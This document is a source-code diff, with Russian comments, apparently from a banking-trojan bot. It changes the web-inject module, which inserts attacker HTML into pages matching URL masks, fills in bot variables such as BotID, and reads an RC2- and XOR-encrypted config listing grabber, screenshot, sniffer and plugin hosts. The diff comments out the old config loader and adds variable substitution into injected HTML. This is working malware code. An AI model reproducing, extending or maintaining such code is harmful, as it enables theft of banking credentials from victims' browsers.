@@ -111,199 +111,214 @@ void HTMLInjectSetSystemVariables(THTMLInjectData *Data)
 	STR::Free(BotID);
 }
 
+
+// Устанавливаем значение из списка переменных
+void SetValuesFromVariables(TValues* Values, THTMLInjectData *Data)
+{
+	int Count = Values->Count();
+	for (int i = 0; i < Count; i++)
+	{
+		TValue* V = Values->Items(i);
+		HTMLInjectSetVariableValue(Data, V->Name.t_str(), V->Value.t_str());
+	}
+}
+
 // ----------------------------------------------------------------------------
 
 
-PCHAR ReadStrBlock_(PCHAR &Buf)
-{
-	// Функция читаем строку из буфера и смещает указатель за строку
-	// формат буфера (DWORD - Длина строки)(Строка)
-	DWORD Size = *(DWORD*)Buf;
-	Buf += sizeof(DWORD);
-	if (Size == 0)
-		return NULL;
-	PCHAR Str = STR::New(Buf, Size);
-	Buf += Size;
-	return Str;
-}
-
-void ReadStrBlock_(PCHAR &Buf, string &Out)
-{
-	// Функция читаем строку из буфера и смещает указатель за строку
-	// формат буфера (DWORD - Длина строки)(Строка)
-	DWORD Size = *(DWORD*)Buf;
-	Buf += sizeof(DWORD);
-	if (Size == 0) return;
-
-	Out.Copy(Buf, 0, Size);
-
-	Buf += Size;
-}
+//PCHAR ReadStrBlock_(PCHAR &Buf)
+//{
+//	// Функция читаем строку из буфера и смещает указатель за строку
+//	// формат буфера (DWORD - Длина строки)(Строка)
+//	DWORD Size = *(DWORD*)Buf;
+//	Buf += sizeof(DWORD);
+//	if (Size == 0)
+//		return NULL;
+//	PCHAR Str = STR::New(Buf, Size);
+//	Buf += Size;
+//	return Str;
+//}
 
 
-
-bool DoLoadConfigFromFileEx(TBotConfig* Config, PWCHAR FileName)
-{
-
-	// Загрухить конфигурационный файл
-
-	Config->HTMLInjects->Clear();
-
-	CFGDBG("BotConfig", "Загружаем файл");
-
-	HANDLE File = (HANDLE)pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ,
-		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-
-	if (File == INVALID_HANDLE_VALUE)
-	{
-		CFGDBG("BotConfig", "Ошибка загрузки файла!");
-		return false;
-	}
-
-	DWORD ID = 0;
-	DWORD h = 0;
-	DWORD FileSize = (DWORD)pGetFileSize(File, &h);
-	LPBYTE FileBuf = (LPBYTE)MemAlloc(FileSize + 1);
-	if (FileBuf == NULL)
-	{
-		pCloseHandle(File);
-		return false;
-	}
-
-	m_memset(FileBuf, 0, FileSize + 1);
-
-	DWORD Readed = 0;
-	if (!pReadFile(File, FileBuf, FileSize, &Readed, NULL))
-	{
-		MemFree(FileBuf);
-		pCloseHandle(File);
-		return false;
-	}
+//void ReadStrBlock_(PCHAR &Buf, string &Out)
+//{
+//	// Функция читаем строку из буфера и смещает указатель за строку
+//	// формат буфера (DWORD - Длина строки)(Строка)
+//	DWORD Size = *(DWORD*)Buf;
+//	Buf += sizeof(DWORD);
+//	if (Size == 0) return;
+//
+//	Out.Copy(Buf, 0, Size);
+//
+//	Buf += Size;
+//}
 
 
-	// Проверяем фвляется ли файл конфигом
 
-	if (!Config::IsConfig((PCHAR)FileBuf))
-	{
-		PCHAR Password = GetMainPassword();
-		RC2Crypt::Decode(Password, (PCHAR)FileBuf, FileSize);
-		STR::Free(Password);
 
-		if (!Config::IsConfig((PCHAR)FileBuf))
-		{
-			MemFree(FileBuf);
-			pCloseHandle(File);
-			return false;
-        }
-	}
+//bool DoLoadConfigFromFileEx(TBotConfig* Config, PWCHAR FileName)
+//{
+//
+//	// Загрухить конфигурационный файл
+//
+//	Config->HTMLInjects->Clear();
+//
+//	CFGDBG("BotConfig", "Загружаем файл");
+//
+//	HANDLE File = (HANDLE)pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ,
+//		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+//
+//	if (File == INVALID_HANDLE_VALUE)
+//	{
+//		CFGDBG("BotConfig", "Ошибка загрузки файла!");
+//		return false;
+//	}
+//
+//	DWORD ID = 0;
+//	DWORD h = 0;
+//	DWORD FileSize = (DWORD)pGetFileSize(File, &h);
+//	LPBYTE FileBuf = (LPBYTE)MemAlloc(FileSize + 1);
+//	if (FileBuf == NULL)
+//	{
+//		pCloseHandle(File);
+//		return false;
+//	}
+//
+//	m_memset(FileBuf, 0, FileSize + 1);
+//
+//	DWORD Readed = 0;
+//	if (!pReadFile(File, FileBuf, FileSize, &Readed, NULL))
+//	{
+//		MemFree(FileBuf);
+//		pCloseHandle(File);
+//		return false;
+//	}
+//
+//
+//	// Проверяем фвляется ли файл конфигом
+//
+//	if (!Config::IsConfig((PCHAR)FileBuf))
+//	{
+//		PCHAR Password = GetMainPassword();
+//		RC2Crypt::Decode(Password, (PCHAR)FileBuf, FileSize);
+//		STR::Free(Password);
+//
+//		if (!Config::IsConfig((PCHAR)FileBuf))
+//		{
+//			MemFree(FileBuf);
+//			pCloseHandle(File);
+//			return false;
+//        }
+//	}
+//
+//	// Читаем данные
+//	PCHAR Buf = (PCHAR)XORCrypt::DecodeBuffer
+//		((PCHAR)ConfigSignature, FileBuf, Readed);
+//	if (Buf == NULL)
+//	{
+//		pCloseHandle(File);
+//		return false;
+//	}
+//
+//	// Пропускаем один устаревший параметр размером один байт
+//	Buf++;
+//
+//	// определяем количество масок
+//	DWORD Count = *(DWORD*)Buf;
+//	Buf += sizeof(DWORD);
+//
+//	// Загружаем информацию о хостах
+//
+//	FgrHostFromCfg = ReadStrBlock_(Buf);
+//	GraHostFromCfg = ReadStrBlock_(Buf);
+//	ScrHostFromCfg = ReadStrBlock_(Buf);
+//	SniHostFromCfg = ReadStrBlock_(Buf);
+//	PluginsHostFromCfg = ReadStrBlock_(Buf);
+//
+//	// Период обновления конфига
+//	TimeOut = *(DWORD*)Buf;
+//	Buf += sizeof(DWORD);
+//
+//	// ------------- Настройки протоколов -------------//
+//	bHttp = *Buf != 0;
+//	Buf++;
+//
+//	bHttps = *Buf != 0;
+//	Buf++;
+//
+//	// ------------- Загружаем данные инжектов -------------//
+//	THTMLInject *Inject;
+//	THTMLInjectData *Data;
+//	DWORD DataCount;
+//	DWORD Mode;
+//
+//	for (DWORD i = 0; i < Count; i++)
+//	{
+//		Inject = Config->HTMLInjects->AddInject();
+//		if (Inject == NULL)
+//			break;
+//
+//		ID++;
+//		Inject->ID = ID;
+//		// Читаем маску инжекта
+//		Inject->URL = ReadStrBlock_(Buf);
+//
+//		// Читаем режимы обработки
+//		Mode = *(DWORD*)Buf;
+//		Buf += sizeof(DWORD);
+//
+//		// Декодируем старую версию флага
+//		Inject->GET = (Mode == 1 || Mode == 3 || Mode == 4 || Mode == 6);
+//		Inject->POST = (Mode == 2 || Mode == 3 || Mode == 5 || Mode == 6);
+//		Inject->IsLog = (Mode <= 3);
+//
+//		DataCount = *(DWORD*)Buf;
+//		Buf += sizeof(DWORD);
+//
+//		for (DWORD j = 0; j < DataCount; j++)
+//		{
+//			Data = Inject->AddData();
+//			if (Data == NULL)
+//				break;
+//
+//			ID++;
+//			Data->ID = ID;
+//			ReadStrBlock_(Buf, Data->Before);
+//			ReadStrBlock_(Buf, Data->Inject);
+//			ReadStrBlock_(Buf, Data->After);
+//
+////			Data->Before = ReadStrBlock_(Buf);
+////			Data->Inject = ReadStrBlock_(Buf);
+////			Data->After = ReadStrBlock_(Buf);
+//
+//			if (!Data->Before.IsEmpty())
+//				Data->MacrosHash = Data->Before.Hash();
+//				;
+//
+//			// В рабочем боте подменяем переменные в момент загрузки конфига
+//			#ifndef BV_APP
+//				HTMLInjectSetSystemVariables(Data);
+//			#endif
+//
+//		}
+//	}
+//	MemFree(FileBuf);
+//
+//	// Получаем время изменения файла
+////	FILETIME Tm;
+////	pGetFileTime(File, &Tm, &Tm, &Config->ConfigTime);
+//
+//	// -------------------------------
+//	pCloseHandle(File);
+//
+//	CFGDBG("BotConfig", "Файл загружен");
+//
+//	// Сохраняем имя последнего загруженного файла
+////	Config->LastConfigFile = WSTR::New(FileName);
+//
+//	return true;
+//}
 
-	// Читаем данные
-	PCHAR Buf = (PCHAR)XORCrypt::DecodeBuffer
-		((PCHAR)ConfigSignature, FileBuf, Readed);
-	if (Buf == NULL)
-	{
-		pCloseHandle(File);
-		return false;
-	}
-
-	// Пропускаем один устаревший параметр размером один байт
-	Buf++;
-
-	// определяем количество масок
-	DWORD Count = *(DWORD*)Buf;
-	Buf += sizeof(DWORD);
-
-	// Загружаем информацию о хостах
-
-	FgrHostFromCfg = ReadStrBlock_(Buf);
-	GraHostFromCfg = ReadStrBlock_(Buf);
-	ScrHostFromCfg = ReadStrBlock_(Buf);
-	SniHostFromCfg = ReadStrBlock_(Buf);
-	PluginsHostFromCfg = ReadStrBlock_(Buf);
-
-	// Период обновления конфига
-	TimeOut = *(DWORD*)Buf;
-	Buf += sizeof(DWORD);
-
-	// ------------- Настройки протоколов -------------//
-	bHttp = *Buf != 0;
-	Buf++;
-
-	bHttps = *Buf != 0;
-	Buf++;
-
-	// ------------- Загружаем данные инжектов -------------//
-	THTMLInject *Inject;
-	THTMLInjectData *Data;
-	DWORD DataCount;
-	DWORD Mode;
-
-	for (DWORD i = 0; i < Count; i++)
-	{
-		Inject = Config->HTMLInjects->AddInject();
-		if (Inject == NULL)
-			break;
-
-		ID++;
-		Inject->ID = ID;
-		// Читаем маску инжекта
-		Inject->URL = ReadStrBlock_(Buf);
-
-		// Читаем режимы обработки
-		Mode = *(DWORD*)Buf;
-		Buf += sizeof(DWORD);
-
-		// Декодируем старую версию флага
-		Inject->GET = (Mode == 1 || Mode == 3 || Mode == 4 || Mode == 6);
-		Inject->POST = (Mode == 2 || Mode == 3 || Mode == 5 || Mode == 6);
-		Inject->IsLog = (Mode <= 3);
-
-		DataCount = *(DWORD*)Buf;
-		Buf += sizeof(DWORD);
-
-		for (DWORD j = 0; j < DataCount; j++)
-		{
-			Data = Inject->AddData();
-			if (Data == NULL)
-				break;
-
-			ID++;
-			Data->ID = ID;
-			ReadStrBlock_(Buf, Data->Before);
-			ReadStrBlock_(Buf, Data->Inject);
-			ReadStrBlock_(Buf, Data->After);
-
-//			Data->Before = ReadStrBlock_(Buf);
-//			Data->Inject = ReadStrBlock_(Buf);
-//			Data->After = ReadStrBlock_(Buf);
-
-			if (!Data->Before.IsEmpty())
-				Data->MacrosHash = Data->Before.Hash();
-				;
-
-			// В рабочем боте подменяем переменные в момент загрузки конфига
-			#ifndef BV_APP
-				HTMLInjectSetSystemVariables(Data);
-			#endif
-
-		}
-	}
-	MemFree(FileBuf);
-
-	// Получаем время изменения файла
-//	FILETIME Tm;
-//	pGetFileTime(File, &Tm, &Tm, &Config->ConfigTime);
-
-	// -------------------------------
-	pCloseHandle(File);
-
-	CFGDBG("BotConfig", "Файл загружен");
-
-	// Сохраняем имя последнего загруженного файла
-//	Config->LastConfigFile = WSTR::New(FileName);
-
-	return true;
-}
 // ----------------------------------------------------------------------------
 
 //bool Config::LoadConfigFromFile(TBotConfig *Config, PWCHAR FileName)
@@ -369,16 +384,18 @@ bool DoLoadConfigFromFileEx(TBotConfig* Config, PWCHAR FileName)
 
 // ----------------------------------------------------------------------------
 
-void FreeHTMLInjectData(LPVOID Data)
-{
-	// Уничтожить данные HTML инжекта
-	delete (THTMLInjectData*)Data;
-}
+//void FreeHTMLInjectData(LPVOID Data)
+//{
+//	// Уничтожить данные HTML инжекта
+//	delete (THTMLInjectData*)Data;
+//}
 
-void HTMLInjects::FreeInject(THTMLInject *Inject)
-{
-	// Заглушка
-}
+
+//void HTMLInjects::FreeInject(THTMLInject *Inject)
+//{
+//	// Заглушка
+//}
+
 
 
 // ----------------------------------------------------------------------------
@@ -883,6 +900,8 @@ bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
 			HTMLInjectSetSystemVariables(&Data);
 		#endif
 
+
+        SetValuesFromVariables(Config::GetConfig()->HTMLInjects->Variables, &Data);
 
 		Injected  = false;
 		NewBuffer = NULL;
